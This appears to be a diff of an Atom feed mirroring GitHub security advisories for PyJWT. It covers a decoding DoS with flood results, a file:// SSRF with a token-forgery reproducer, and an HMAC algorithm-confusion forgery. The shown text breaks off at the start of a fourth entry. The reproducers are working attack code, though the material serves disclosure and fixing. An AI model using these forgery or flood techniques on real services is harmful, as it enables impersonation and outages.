@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-06-15T16:08:52.099Z</updated>
+    <updated>2026-06-15T19:54:10.297Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,746 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[pyjwt] PyJWT: Unauthenticated DoS via unbounded Base64URL decoding of unused payload segment in b64=false detached JWS]]></title>
+        <id>https://github.com/advisories/GHSA-w7vc-732c-9m39</id>
+        <link href="https://github.com/advisories/GHSA-w7vc-732c-9m39"/>
+        <updated>2026-06-15T19:29:13.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>[!NOTE]
+Practical impact depends on whether request body-size limits are enforced upstream (proxy/web-server/framework). Deployments with typical body-size caps (≤2 MB) bound the amplifier significantly; deployments accepting larger token inputs are more exposed.</p>
+</blockquote>
+<p>When verifying detached JWS tokens using the unencoded-payload option (<code>"b64": false</code>, RFC 7797), PyJWT performs <strong>Base64URL decoding of the compact-serialization payload segment</strong> <em>before</em> enforcing the detached-payload rules.</p>
+<p>For <code>b64=false</code>, PyJWT later <strong>discards</strong> that decoded payload and replaces it with the caller-provided <code>detached_payload</code>. In practice, this turns the middle segment into an attacker-controlled “work amplifier”: a remote client can supply an arbitrarily large Base64URL payload segment that forces <strong>CPU work + memory allocations</strong> even if the signature is invalid.</p>
+<p>This creates an <strong>unauthenticated DoS</strong> vector against any endpoint that verifies detached JWS using PyJWT.</p>
+<hr>
+<h2 id="affected-components">Affected Component(s)</h2>
+<ul>
+<li><p><code>jwt/api_jws.py</code></p>
+<ul>
+<li><code>PyJWS.decode()</code> / <code>PyJWS.decode_complete()</code></li>
+<li><code>_load()</code> (parsing and Base64URL decoding)</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="root-cause-exact-logic-flaw">Root Cause (exact logic flaw)</h2>
+<h3 id="what-happens-in-the-code">What happens in the code</h3>
+<p>In <code>jwt/api_jws.py</code>, <code>decode_complete()</code> does the following (order matters):</p>
+<ul>
+<li>Calls <code>_load(jwt)</code> first, which decodes the token segments</li>
+<li>Only after that, checks <code>header.get("b64")</code> and if <code>False</code>, it replaces <code>payload = detached_payload</code> and rebuilds the signing input</li>
+</ul>
+<p>This behavior is visible in <code>decode_complete()</code>:</p>
+<ul>
+<li><code>_load(jwt)</code> happens <strong>before</strong> the <code>b64=false</code> handling</li>
+<li>then <code>payload = detached_payload</code> and <code>signing_input = ... detached_payload</code> happens afterward ([GitHub][1])</li>
+</ul>
+<p>Inside <code>_load()</code>, PyJWT unconditionally performs:</p>
+<ul>
+<li><code>payload = base64url_decode(payload_segment)</code>
+This is the expensive step the attacker can amplify ([GitHub][1])</li>
+</ul>
+<h3 id="why-this-becomes-a-vulnerability">Why this becomes a vulnerability</h3>
+<p>For <code>b64=false</code> detached JWS, the payload segment in compact form is effectively <strong>not needed</strong> for verification in PyJWT’s own logic (since the library uses <code>detached_payload</code> as the real payload). Yet PyJWT still decodes it first, meaning:</p>
+<ul>
+<li>cost is paid <strong>even when signature is invalid</strong></li>
+<li>the decoded bytes are <strong>discarded</strong></li>
+<li>attacker controls the size of this cost via token length</li>
+</ul>
+<hr>
+<h2 id="impact-evidence-driven">Impact (evidence-driven)</h2>
+<h3 id="security-impact">Security impact</h3>
+<ul>
+<li><strong>Unauthenticated remote DoS</strong>: decoding work happens before signature rejection → attacker does not need signing key.</li>
+<li><strong>CPU amplification</strong>: Base64URL decode time scales linearly with payload segment size.</li>
+<li><strong>Memory amplification</strong>: decoded output allocates large byte buffers (tens of MB per request).</li>
+<li><strong>Operational impact</strong>: request queueing / worker starvation under modest concurrency bursts.</li>
+</ul>
+<h3 id="standards-context-rfc-7797">Standards context (RFC 7797)</h3>
+<p>RFC 7797 explicitly notes this option is used when payload is large and/or detached, and discusses interoperability requirements around marking it critical (“crit” with “b64”). ([IETF Datatracker][2])
+(PyJWT supports <code>crit</code> validation, but the issue here is decode order / unbounded decode of an unused segment.)</p>
+<hr>
+<h2 id="affected-versions">Affected Versions</h2>
+<ul>
+<li><strong>Confirmed affected:</strong> PyJWT <strong>2.12.1</strong> (tested from your local editable install and repo).</li>
+<li><strong>Likely affected:</strong> all versions that include detached payload support for JWS decoding, which was introduced in <strong>2.4.0</strong> (“Add detached payload support for JWS encoding and decoding”). ([pyjwt.readthedocs.io][3])</li>
+</ul>
+<p>(For GHSA, this phrasing is strong: “confirmed” + “likely since feature introduction”.)</p>
+<hr>
+<h1 id="threat-model">Threat Model</h1>
+<h3 id="typical-real-deployment">Typical real deployment</h3>
+<p>A service verifies signed HTTP requests or webhooks using detached JWS:</p>
+<ul>
+<li>token is provided in JSON body / query / header</li>
+<li>actual payload is the HTTP request body passed as <code>detached_payload</code></li>
+</ul>
+<h3 id="attacker">Attacker</h3>
+<ul>
+<li>remote unauthenticated client</li>
+<li>can send requests to verify endpoint</li>
+<li>does <strong>not</strong> need a valid signature (invalid signature still triggers the expensive decode path)</li>
+</ul>
+<h3 id="attack-chain">Attack chain</h3>
+<ol>
+<li>Attacker crafts a JWS compact token with header containing <code>"b64": false</code> and <code>crit:["b64"]</code>.</li>
+<li>Attacker inflates the <strong>payload segment</strong> (middle segment) to millions of Base64URL characters.</li>
+<li>Server calls <code>PyJWS.decode(...detached_payload=...)</code>.</li>
+<li>PyJWT decodes the inflated segment (CPU + memory).</li>
+<li>Signature is rejected afterward (401) — but resources already consumed.</li>
+<li>Repeated requests or bursts cause queueing/worker starvation → DoS.</li>
+</ol>
+<hr>
+<h1 id="proof-of-concept---file-names--results">Proof of Concept - file names + results</h1>
+<h2 id="poc-placement">PoC placement</h2>
+<ul>
+<li><p><a href="https://github.com/user-attachments/files/26132755/server_localhost.py">server_localhost.py</a></p>
+</li>
+<li><p><a href="https://github.com/user-attachments/files/26132757/client_localhost.py">client_localhost.py</a></p>
+</li>
+<li><p><a href="https://github.com/user-attachments/files/26132760/flood_localhost.py">flood_localhost.py</a></p>
+</li>
+</ul>
+<hr>
+<h2 id="poc--1---localhost-verification-server">PoC # 1 - Localhost verification server</h2>
+<p><strong>File:</strong> <a href="https://github.com/user-attachments/files/26132755/server_localhost.py">server_localhost.py</a></p>
+<p><strong>Purpose:</strong> real HTTP endpoint (<code>POST /verify</code>) that calls PyJWT detached verification and prints:
+<code>ok / time_ms / peak_bytes / token_len / error</code>.</p>
+<h3 id="results-server-console-output">Results (server console output)</h3>
+<pre><code class="language-text">[+] Listening on http://127.0.0.1:8000
+[+] POST /verify  JSON: {"token": "..."}
+
+[127.0.0.1] ok=True  time_ms=0.102 peak_bytes=2624     token_len=117      err=None
+[127.0.0.1] ok=False time_ms=2.012 peak_bytes=2000983  token_len=500078   err=InvalidSignatureError
+[127.0.0.1] ok=True  time_ms=1.591 peak_bytes=2001061  token_len=500117   err=None
+
+[127.0.0.1] ok=True  time_ms=0.065 peak_bytes=2304     token_len=117      err=None
+[127.0.0.1] ok=False time_ms=7.534 peak_bytes=8000983  token_len=2000078  err=InvalidSignatureError
+[127.0.0.1] ok=True  time_ms=6.347 peak_bytes=8001061  token_len=2000117  err=None
+
+[127.0.0.1] ok=True  time_ms=0.066 peak_bytes=2304     token_len=117      err=None
+[127.0.0.1] ok=False time_ms=23.034 peak_bytes=32000983 token_len=8000078 err=InvalidSignatureError
+[127.0.0.1] ok=True  time_ms=22.097 peak_bytes=32001061 token_len=8000117 err=None
+</code></pre>
+<p><strong>Key takeaways from these results</strong></p>
+<ul>
+<li><p>At <strong>8,000,000 chars</strong>, a single invalid-signature request still causes:</p>
+<ul>
+<li><strong>~23 ms</strong> server work</li>
+<li><strong>~32 MB</strong> peak allocations</li>
+<li>returns <strong>401</strong> (invalid signature) → attacker does not need key.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="poc--2---localhost-network-client">PoC # 2 - Localhost network client</h2>
+<p><strong>File:</strong> <a href="https://github.com/user-attachments/files/26132757/client_localhost.py">client_localhost.py</a>
+<strong>Purpose:</strong> generates baseline + (invalid signature) + (valid signature) tokens and sends them over HTTP to localhost server.</p>
+<h3 id="results-client-output">Results (client output)</h3>
+<h4 id="payload-chars--500000">payload-chars = 500,000</h4>
+<pre><code class="language-text">=== BASELINE (valid b64=false token) ===
+HTTP: 200
+client_wall_ms: 6.3499...
+server_time_ms: 0.10197...
+server_peak_bytes: 2624
+
+=== ATTACK (INVALID signature - attacker needs no key) ===
+HTTP: 401
+client_wall_ms: 4.1010...
+server_time_ms: 2.01217...
+server_peak_bytes: 2000983
+error: InvalidSignatureError
+
+=== ATTACK (VALID signature - accepted path still wastes) ===
+HTTP: 200
+client_wall_ms: 3.6586...
+server_time_ms: 1.59092...
+server_peak_bytes: 2001061
+</code></pre>
+<h4 id="payload-chars--2000000">payload-chars = 2,000,000</h4>
+<pre><code class="language-text">=== BASELINE ===
+HTTP: 200
+server_time_ms: 0.06527...
+server_peak_bytes: 2304
+
+=== ATTACK (INVALID signature) ===
+HTTP: 401
+server_time_ms: 7.53430...
+server_peak_bytes: 8000983
+
+=== ATTACK (VALID signature) ===
+HTTP: 200
+server_time_ms: 6.34682...
+server_peak_bytes: 8001061
+</code></pre>
+<h4 id="payload-chars--8000000">payload-chars = 8,000,000</h4>
+<pre><code class="language-text">=== BASELINE ===
+HTTP: 200
+server_time_ms: 0.06573...
+server_peak_bytes: 2304
+
+=== ATTACK (INVALID signature) ===
+HTTP: 401
+server_time_ms: 23.03403...
+server_peak_bytes: 32000983
+
+=== ATTACK (VALID signature) ===
+HTTP: 200
+server_time_ms: 22.09702...
+server_peak_bytes: 32001061
+</code></pre>
+<p><strong>Why this is strong evidence</strong></p>
+<ul>
+<li>The server clearly does heavy work <strong>before</strong> rejecting invalid signatures.</li>
+<li>The “valid signature” case shows even accepted requests waste resources due to unused payload segment.</li>
+</ul>
+<hr>
+<h2 id="poc--3---localhost-flood--burst-concurrency">PoC # 3 - Localhost flood / burst concurrency</h2>
+<p><strong>File:</strong> <a href="https://github.com/user-attachments/files/26132760/flood_localhost.py">flood_localhost.py</a>
+<strong>Purpose:</strong> sends <strong>N concurrent</strong> invalid-signature requests over HTTP to demonstrate queueing/worker starvation.</p>
+<h3 id="results-your-run-20-concurrent--8000000-chars">Results (your run: 20 concurrent @ 8,000,000 chars)</h3>
+<pre><code class="language-text">total_wall_ms: 1374.5405770000616
+
+(16, 401, 1156.4504789998864, 21.350951999920653, 32000983, 'InvalidSignatureError')
+(19, 401, 1151.2852699997893, 21.208721999755653, 32000983, 'InvalidSignatureError')
+(18, 401, 1102.7211239997996, 21.685218999664357, 32000983, 'InvalidSignatureError')
+(13, 401, 1102.0718189997751, 21.26572200040755, 32000983, 'InvalidSignatureError')
+(11, 401, 1095.9345460000804, 20.586017000368884, 32000983, 'InvalidSignatureError')
+(17, 401, 1085.2552810001725, 22.893039000337012, 32000983, 'InvalidSignatureError')
+(10, 401, 1078.3629560000918, 22.737160999895423, 32000983, 'InvalidSignatureError')
+(7,  401, 1048.2011740000416, 22.476282000297942, 32000983, 'InvalidSignatureError')
+(8,  401, 378.93017700025666, 21.377330999712285, 32000983, 'InvalidSignatureError')
+(1,  401, 281.45106800002395, 21.34223099983501, 32000983, 'InvalidSignatureError')
+</code></pre>
+<p><strong>Interpretation</strong></p>
+<ul>
+<li>Each request still costs <del><strong>20–23 ms</strong> server processing and **</del>32 MB** peak allocations.</li>
+<li>But client-observed latency rises up to <strong>~1.15 seconds</strong> because requests queue behind each other → clear worker starvation/HoL blocking.</li>
+<li>All were rejected with <strong>401 InvalidSignatureError</strong> → still unauthenticated.</li>
+</ul>
+<hr>
+<h1 id="fix">Fix</h1>
+<h3 id="goal">Goal</h3>
+<p>Prevent unbounded resource consumption from an attacker-controlled payload segment that is unused in <code>b64=false</code> detached flow.</p>
+<h3 id="minimal-change-strategy">Minimal change strategy</h3>
+<p>In <code>_load()</code> (or by refactoring parse order), <strong>do not Base64-decode <code>payload_segment</code> until after you know whether <code>b64=false</code> applies</strong>.</p>
+<p>Two safe options:</p>
+<ol>
+<li><p><strong>Reject non-empty payload segment when <code>b64=false</code></strong></p>
+<ul>
+<li>Parse header first</li>
+<li>If <code>b64</code> is false and <code>payload_segment</code> is non-empty → raise <code>DecodeError</code> <em>before</em> decoding</li>
+<li>Then verification uses <code>detached_payload</code> only</li>
+</ul>
+</li>
+<li><p><strong>Skip decoding payload segment entirely when <code>b64=false</code></strong></p>
+<ul>
+<li>Keep payload segment as raw bytes or empty</li>
+<li>Use detached payload for signing input</li>
+</ul>
+</li>
+</ol>
+<p>This aligns with the idea that detached payload is the trusted payload input for verification; the compact payload segment should not become a resource amplification vector.</p>
+<p>(Implementation context: the current decode order and unconditional <code>base64url_decode(payload_segment)</code> are visible in the file and line region around <code>_load()</code> and <code>decode_complete()</code> ([GitHub][1]).)</p>
+<hr>
+<h1 id="workarounds">Workarounds</h1>
+<ul>
+<li>Enforce strict <strong>max token length</strong> at the HTTP boundary (proxy/gateway).</li>
+<li>Apply rate limiting on verification endpoints.</li>
+<li>If detached JWS (<code>b64=false</code>) is not needed in your app, reject tokens where header includes <code>"b64": false</code>.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48525">https://nvd.nist.gov/vuln/detail/CVE-2026-48525</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-178.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-178.yaml</a></li>
+<li><a href="https://github.com/advisories/GHSA-w7vc-732c-9m39">https://github.com/advisories/GHSA-w7vc-732c-9m39</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w7vc-732c-9m39</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-15T19:29:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[PyJWT] PyJWKClient: missing scheme allowlist enables CVE-2024-21643-class SSRF + token forgery via file://, ftp://, data: schemes]]></title>
+        <id>https://github.com/advisories/GHSA-993g-76c3-p5m4</id>
+        <link href="https://github.com/advisories/GHSA-993g-76c3-p5m4"/>
+        <updated>2026-06-15T19:28:43.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>[!NOTE]
+The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. Severity is scored for the scheme-acceptance bug in isolation.</p>
+</blockquote>
+<h2 id="summary">Summary</h2>
+<p>PyJWKClient passes its <code>uri</code> argument directly to <code>urllib.request.urlopen()</code> which uses Python stdlib's default <code>OpenerDirector</code> registering <code>HTTPHandler</code>, <code>HTTPSHandler</code>, <code>FTPHandler</code>, <strong><code>FileHandler</code></strong>, and <code>DataHandler</code>. There is currently no documented option to restrict which schemes PyJWKClient will fetch.</p>
+<p>If an application's <code>jku</code> URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can:</p>
+<ol>
+<li>Cause PyJWKClient to read arbitrary local files via <code>file://</code> (SSRF on local filesystem) — the file's contents are passed to <code>json.load</code>.</li>
+<li>Cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface).</li>
+<li><strong>Forge tokens that PyJWT verifies as valid</strong> — if the attacker can write to any path the JKU URL points at AND influences the URL, they can plant a JWK Set containing their own public key, sign tokens with the matching private key, and <code>jwt.decode()</code> accepts.</li>
+</ol>
+<h2 id="affected-versions">Affected versions</h2>
+<p>Tested and reproducible on <strong>PyJWT 2.11.0 and 2.12.1</strong>. Likely all versions back to PyJWKClient introduction.</p>
+<h2 id="reproducer-full-attack-chain--verified-empirically">Reproducer (full attack chain — verified empirically)</h2>
+<pre><code class="language-python">import jwt as pyjwt
+from jwt import PyJWKClient
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+import json, base64, time
+
+# Attacker generates keypair (no relation to real IdP)
+key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+pub_n = key.public_key().public_numbers().n
+
+def b64u(n):
+    bl = (n.bit_length() + 7) // 8
+    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()
+
+# Attacker writes JWK Set containing their public key to /tmp
+jwks = {"keys":[{"kty":"RSA","kid":"attacker","use":"sig","alg":"RS256",
+                  "n":b64u(pub_n),"e":"AQAB"}]}
+with open("/tmp/attacker.json","w") as f:
+    json.dump(jwks, f)
+
+# Attacker mints token signed with their private key, jku=file://
+priv_pem = key.private_bytes(serialization.Encoding.PEM,
+    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
+now = int(time.time())
+token = pyjwt.encode(
+    {"sub":"attacker","aud":"target-app","iat":now,"exp":now+3600},
+    priv_pem, algorithm="RS256",
+    headers={"kid":"attacker","jku":"file:///tmp/attacker.json","typ":"JWT"})
+
+# Vulnerable application pattern: caller derives jku from token header
+# and passes to PyJWKClient without scheme validation
+header = pyjwt.get_unverified_header(token)
+client = PyJWKClient(header["jku"])      # &lt;-- accepts file:// silently
+key_obj = client.get_signing_key_from_jwt(token)
+decoded = pyjwt.decode(token, key_obj.key, algorithms=["RS256"],
+                       audience="target-app")
+print("Token verified:", decoded)
+# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}
+</code></pre>
+<h2 id="cross-library-evidence--pyjwt-is-the-outlier">Cross-library evidence — PyJWT is the outlier</h2>
+<p>The same composition pattern is structurally safe in 4 other mainstream JWT libraries:</p>
+<table>
+<thead>
+<tr>
+<th>Library</th>
+<th>Behavior on <code>jku=file://...</code></th>
+<th>Mechanism</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>PyJWT 2.12.1</strong> (Python)</td>
+<td><strong>Reads file from disk, parses, uses for signature verification</strong></td>
+<td>urllib default OpenerDirector includes FileHandler</td>
+</tr>
+<tr>
+<td>panva/jose 6.2.3 (Node.js)</td>
+<td>Refuses pre-fetch</td>
+<td>WHATWG <code>fetch()</code> rejects non-http(s) at fetch-spec layer</td>
+</tr>
+<tr>
+<td>golang-jwt + MicahParks/keyfunc v3.4.0 (Go)</td>
+<td>Refuses pre-fetch</td>
+<td><code>http.DefaultTransport</code> only registers http/https</td>
+</tr>
+<tr>
+<td>Microsoft.IdentityModel.Tokens 8.18.0 (.NET)</td>
+<td>Refuses pre-fetch</td>
+<td><code>HttpDocumentRetriever</code> defaults <code>RequireHttps=true</code></td>
+</tr>
+<tr>
+<td>Spring Security NimbusJwtDecoder 6.3.4 (Java)</td>
+<td>Refuses pre-fetch</td>
+<td>URI parser delegation refuses non-http(s) at request build</td>
+</tr>
+</tbody></table>
+<p>PyJWT is the only library of these 5 where the default behavior allows <code>file://</code> to reach the fetch layer.</p>
+<h2 id="recommended-fix">Recommended fix</h2>
+<p>Add <code>allowed_schemes: tuple[str, ...] = ("https", "http")</code> kwarg to <code>PyJWKClient.__init__</code>. Pre-validate URL scheme before invoking <code>urllib.request.urlopen</code>. URLs with disallowed schemes raise <code>PyJWKClientError</code> before any fetch is attempted.</p>
+<h3 id="diff-sketch-against-jwtjwks_clientpy">Diff sketch against <code>jwt/jwks_client.py</code></h3>
+<pre><code class="language-python">def __init__(
+    self, uri: str,
+    cache_keys: bool = False, max_cached_keys: int = 16,
+    cache_jwk_set: bool = True, lifespan: float = 300,
+    headers: dict[str, Any] | None = None, timeout: float = 30,
+    ssl_context: SSLContext | None = None,
+    allowed_schemes: tuple[str, ...] = ("https", "http"),  # NEW
+):
+    """...
+    :param allowed_schemes: URL schemes the JWKS endpoint is permitted
+        to use. Default ``("https", "http")``. Pass ``("https",)`` for
+        HTTPS-only operation. URLs with disallowed schemes raise
+        ``PyJWKClientError`` before any fetch is attempted.
+    """
+    # ... existing init code ...
+    self.allowed_schemes = allowed_schemes
+    self._validate_uri_scheme()
+
+
+def _validate_uri_scheme(self) -&gt; None:
+    """Reject the configured URI early if its scheme isn't allowed."""
+    from urllib.parse import urlparse
+    parsed = urlparse(self.uri)
+    scheme = parsed.scheme.lower()
+    if not scheme:
+        raise PyJWKClientError(
+            f"PyJWKClient URI '{self.uri}' has no scheme; expected one of "
+            f"{self.allowed_schemes!r}")
+    if scheme not in self.allowed_schemes:
+        raise PyJWKClientError(
+            f"PyJWKClient URI scheme '{scheme}' is not in allowed_schemes "
+            f"{self.allowed_schemes!r}; refusing to fetch from this URL")
+</code></pre>
+<h3 id="tests-to-add">Tests to add</h3>
+<pre><code class="language-python">def test_pyjwkclient_rejects_file_scheme():
+    with pytest.raises(PyJWKClientError, match="not in allowed_schemes"):
+        PyJWKClient("file:///etc/passwd")
+
+def test_pyjwkclient_rejects_ftp_scheme():
+    with pytest.raises(PyJWKClientError):
+        PyJWKClient("ftp://example.org/keys.json")
+
+def test_pyjwkclient_rejects_data_scheme():
+    with pytest.raises(PyJWKClientError):
+        PyJWKClient('data:application/json,{"keys":[]}')
+
+def test_pyjwkclient_caller_can_lock_to_https_only():
+    with pytest.raises(PyJWKClientError):
+        PyJWKClient("http://internal.test/jwks.json", allowed_schemes=("https",))
+</code></pre>
+<h3 id="compatibility">Compatibility</h3>
+<ul>
+<li>Default <code>allowed_schemes=("https", "http")</code> preserves backwards compatibility for the overwhelming majority of callers using HTTP/HTTPS JWKS endpoints</li>
+<li>Breaking only for callers using non-HTTP schemes intentionally (vanishingly rare)</li>
+<li>No changes to urllib fetch logic itself — the fix is a pre-validation gate</li>
+</ul>
+<h2 id="class-precedent">Class precedent</h2>
+<p>This is the same class as <strong>CVE-2024-21643</strong> (Apache Jena JKU-trust: attacker-supplied JKU URL fetched without scheme validation). NVD-rated CVSS 7.5.</p>
+<h2 id="prior-art-verified-2026-05-06">Prior art (verified 2026-05-06)</h2>
+<p>Confirmed via live recon (NVD direct, OSV.dev, PyJWT GitHub Security Advisories, issue/PR keyword search, CHANGELOG inspection):</p>
+<ul>
+<li>No existing CVE on PyJWT specifically for PyJWKClient URL scheme handling</li>
+<li>No existing GitHub issue or PR addressing scheme allowlisting</li>
+<li>No silent fix in CHANGELOG through 2.12.1</li>
+<li>5 prior PyJWT advisories (CVE-2017-11424, CVE-2022-29217, CVE-2024-53861, CVE-2025-45768, CVE-2026-32597) — none cover this class</li>
+</ul>
+<h2 id="credit">Credit</h2>
+<p>Reported by Keijo Tuominen — independent security research at CMHT.tech (<a href="https://cmht.tech">https://cmht.tech</a>).</p>
+<p>Reproduction artifacts available on request: full multi-language probe pack (5 wrappers × 25 fixtures × 125 cells) demonstrating cross-library divergence at the URL-scheme boundary.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48522">https://nvd.nist.gov/vuln/detail/CVE-2026-48522</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-175.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-175.yaml</a></li>
+<li><a href="https://github.com/advisories/GHSA-993g-76c3-p5m4">https://github.com/advisories/GHSA-993g-76c3-p5m4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-993g-76c3-p5m4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-15T19:28:41.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pyjwt] PyJWT: Public-key JWK accepted as HMAC secret enables forged HS256 tokens when mixed families are allowed]]></title>
+        <id>https://github.com/advisories/GHSA-xgmm-8j9v-c9wx</id>
+        <link href="https://github.com/advisories/GHSA-xgmm-8j9v-c9wx"/>
+        <updated>2026-06-15T19:28:08.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>[!NOTE]
+Exploitation requires a verifier configured with both symmetric and asymmetric algorithms in <code>algorithms=[…]</code> and a raw-JSON JWK as the <code>key=</code> argument, both contrary to documented usage, hence the High attack-complexity rating.</p>
+</blockquote>
+<h3 id="summary">Summary</h3>
+<p>When the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm.   </p>
+<h3 id="details">Details</h3>
+<p>In JWT algorithm confusion attack, the verifier is mistakenly use of public key to be used as the shared secret in symmetric algorithms.
+In pyjwt case, when the verifier is supporting both HMAC with other asymmetric algorithm and mistakenly using the public key of the issuer to verify the token as demonstrated in the following example:</p>
+<p><code>jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"])) </code></p>
+<p>An attacker who specifies in the token header to use HMAC, will cause the verifier to accept the JWK as the secret key in HMAC algorithm. 
+The attacker will be able to forge JWT signed with the public key of the issuer to impersonate any user. </p>
+<p>If we look on current protections implemented in the library, at class HMACAlgorithm:</p>
+<pre><code>  def prepare_key(self, key: str | bytes) -&gt; bytes:
+        key_bytes = force_bytes(key)
+
+        if is_pem_format(key_bytes) or is_ssh_key(key_bytes):
+            raise InvalidKeyError(
+                "The specified key is an asymmetric key or x509 certificate and"
+                " should not be used as an HMAC secret."
+            )
+
+        return key_bytes
+</code></pre>
+<p>We can observe that there is a protection against this type of attacks but only when the verifier is using PEM format or SSH key to verify the token. JSON Web Keys, on the other hand will pass the validation.</p>
+<p>In The following example:
+<code>jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"])) </code>
+There is indeed a wrong implementation of the verifier, but a stronger protection in the library side will prevent and protect against those type of misconfiugrations. </p>
+<p>The bypass happens only if the verifier:
+ (a) allows HS* and an asymmetric algorithm in the same call and (b) passes a public-key value as key.</p>
+<h3 id="poc">PoC</h3>
+<p>Please run the code and observe the payload printed in clear text({"sub":"alice","admin":true}')</p>
+<pre><code>from jwt.api_jws import PyJWS
+import json, base64, hmac, hashlib
+
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")
+
+# Public RSA JWK (public by design)
+rsa_jwk_json = json.dumps({"kty":"RSA","n":"AQAB","e":"AQAB"})
+
+# Attacker-crafted token: flip to HS256 and choose claims
+header  = b64u(b'{"alg":"HS256","typ":"JWT"}')
+payload = b64u(b'{"sub":"alice","admin":true}')
+signing = header + b"." + payload
+
+# Sign with HMAC using the PUBLIC JWK JSON TEXT as the “secret”
+sig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest()
+token = (signing + b"." + b64u(sig)).decode()
+
+# Vulnerable verifier: mixed families + JWK JSON string as key
+jws = PyJWS()
+print(jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"]))
+# -&gt; b'{"sub":"alice","admin":true}'
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Unauthenticated token forgery → full identity/role impersonation at the resource server (authorization bypass).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48526">https://nvd.nist.gov/vuln/detail/CVE-2026-48526</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-179.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-179.yaml</a></li>
+<li><a href="https://github.com/advisories/GHSA-xgmm-8j9v-c9wx">https://github.com/advisories/GHSA-xgmm-8j9v-c9wx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xgmm-8j9v-c9wx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-15T19:28:06.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pyjwt] PyJWT: Algorithm allow-list bypass when decoding with `PyJWK` / `PyJWKClient` keys]]></title>
+        <id>https://github.com/advisories/GHSA-jq35-7prp-9v3f</id>
+        <link href="https://github.com/advisories/GHSA-jq35-7prp-9v3f"/>
+        <updated>2026-06-15T19:27:48.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>[!NOTE]
+Scored assuming a deployment where algorithm policy functions as an authentication/authorization boundary. In deployments where the algorithm policy enforces crypto agility only, the practical confidentiality impact is lower and the issue is closer to an integrity-of-policy-enforcement bug.</p>
+</blockquote>
